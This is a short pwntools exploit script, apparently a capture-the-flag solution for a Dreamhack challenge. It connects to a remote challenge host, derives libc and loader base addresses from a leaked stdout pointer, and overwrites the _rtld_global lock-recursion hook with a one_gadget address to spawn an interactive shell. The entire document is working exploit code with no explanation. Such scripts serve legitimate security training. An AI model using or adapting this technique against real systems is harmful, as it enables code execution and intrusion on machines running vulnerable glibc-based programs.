#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./rtld_patched',checksec=False)
libc = ELF('./libc-2.23.so',checksec=False)
ld = ELF('./ld-2.23.so',checksec = False)

r = remote('host3.dreamhack.games',20252)
# r = process(exe.path)
# input()
r.recvuntil(b'stdout: ')
stdout = int(r.recv(14),16)
libc.address = stdout - libc.sym['_IO_2_1_stdout_']
ld.address = libc.address + 0x3ca000
log.info("libc-base: " + hex(libc.address))
log.info("ld-base : " + hex(ld.address))

ld_global = 2252864 + ld.address
ld_recursive = 3848 + ld_global
one_gadget = 0xf1247 + libc.address

r.sendlineafter(b'addr: ',str(ld_recursive))
r.sendlineafter(b'value: ',str(one_gadget))


r.interactive()